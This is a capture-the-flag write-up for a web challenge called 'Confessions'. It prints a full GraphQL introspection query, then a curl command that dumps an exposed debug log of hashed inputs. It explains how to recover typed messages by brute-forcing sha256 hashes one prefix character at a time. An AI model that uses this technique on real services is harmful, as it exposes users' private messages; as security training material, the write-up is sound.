# Confessions

## What it is

It's a website where you can enter a message, the message will be hashed with sha256 and sent to a server.

The message is hashed and sent every time the input changes (with every character).

This request gives us the types on the graphql API ([source](https://graphql.org/learn/introspection/)):
```
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
```
https://confessions.secu-web.blackfoot.dev/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```
(see types.json for the result)

One interesting type is ```RequestLog``` which has the description ```Show the resolver access log. TODO: remove before production release```.

We can get all access logs with:
```bash
curl 'https://confessions.secu-web.blackfoot.dev/graphql?query=\{requestsLog\{name,args,timestamp\}\}'
```
(see logs.json for the result)

## Solution

(see index.js)

If, for example, someone types "abc" on the website it will make 3 hashes:
1. "a"
2. "ab"
3. "abc"

We can get the first log, which must be 1 character long, and brute force it.

Once we have the first character we can get the second log and brute force the second character and so on.

flag: ```ZOB{plz_d0nt_t3ll_any1}```
